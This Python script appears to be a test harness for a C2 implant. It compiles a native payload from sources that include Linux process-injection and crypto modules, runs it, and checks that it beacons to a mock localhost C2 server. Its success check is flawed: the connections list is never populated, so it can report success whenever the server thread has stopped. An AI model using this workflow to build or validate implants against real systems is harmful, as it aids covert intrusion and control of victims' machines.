#!/usr/bin/env python3
"""
Full C2 test with proper handshake
"""

import socket
import struct
import threading
import time
import subprocess
import os

class MockC2Server:
    def __init__(self, port=4433):
        self.port = port
        self.running = False
        self.connections = []
        
    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('127.0.0.1', self.port))
        self.sock.listen(5)
        self.sock.settimeout(1.0)
        self.running = True
        print(f"[C2] Server listening on 127.0.0.1:{self.port}")
        
    def handle_client(self, conn, addr):
        print(f"[C2] Client connected from {addr}")
        try:
            # Expect "HELLO" 
            data = conn.recv(5)
            if data == b'HELLO':
                print("[C2] Received HELLO handshake")
                # Send response
                conn.send(b'OK\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
                print("[C2] Sent OK response")
                
                # Wait for more data
                conn.settimeout(2.0)
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print(f"[C2] Received {len(data)} bytes: {data[:50]}")
                    
            else:
                print(f"[C2] Invalid handshake: {data}")
                
        except socket.timeout:
            print("[C2] Client timeout")
        except Exception as e:
            print(f"[C2] Error: {e}")
        finally:
            conn.close()
            
    def run(self):
        while self.running:
            try:
                conn, addr = self.sock.accept()
                # Handle in same thread for simplicity
                self.handle_client(conn, addr)
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[C2] Accept error: {e}")
                    
    def stop(self):
        self.running = False
        self.sock.close()

def compile_payload():
    """Compile the payload with debugging"""
    print("[*] Compiling payload...")
    
    cmd = [
        'gcc', '-O2', 
        '-DPLATFORM_LINUX',
        '-DSERVER_HOST="127.0.0.1"',
        '-DSERVER_PORT=4433',
        '-I/workspace/native_payloads/core',
        '-I/workspace/native_payloads/crypto',
        '-I/workspace/native_payloads/network',
        '-I/workspace/native_payloads/inject',
        '/workspace/native_payloads/core/main.c',
        '/workspace/native_payloads/core/utils.c',
        '/workspace/native_payloads/core/commands.c',
        '/workspace/native_payloads/crypto/aes.c',
        '/workspace/native_payloads/crypto/sha256.c',
        '/workspace/native_payloads/network/protocol.c',
        '/workspace/native_payloads/inject/inject_core.c',
        '/workspace/native_payloads/linux/linux_impl.c',
        '/workspace/native_payloads/inject/inject_linux.c',
        '-lpthread', '-ldl',
        '-o', '/tmp/test_payload'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] Payload compiled successfully")
        return True
    else:
        print(f"[-] Compilation failed: {result.stderr[:200]}")
        return False

def main():
    # Compile payload
    if not compile_payload():
        return
        
    # Start C2 server
    c2 = MockC2Server()
    c2.start()
    
    server_thread = threading.Thread(target=c2.run)
    server_thread.daemon = True
    server_thread.start()
    
    time.sleep(1)
    
    # Run payload
    print("[*] Starting payload...")
    proc = subprocess.Popen(
        ['/tmp/test_payload'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Wait for connection
    time.sleep(5)
    
    # Check if connected
    if c2.connections or not server_thread.is_alive():
        print("[+] SUCCESS: Payload connected to C2!")
    else:
        print("[-] FAIL: No connection established")
        
        # Check if process is still running
        if proc.poll() is None:
            print("[*] Payload still running")
        else:
            print(f"[*] Payload exited with code: {proc.poll()}")
            stdout, stderr = proc.communicate()
            if stdout:
                print(f"Stdout: {stdout.decode()[:200]}")
            if stderr:
                print(f"Stderr: {stderr.decode()[:200]}")
    
    # Cleanup
    try:
        proc.terminate()
        proc.wait(timeout=1)
    except:
        proc.kill()
        
    c2.stop()
    server_thread.join(timeout=2)
    
    # Clean up file
    try:
        os.remove('/tmp/test_payload')
    except:
        pass

if __name__ == '__main__':
    main()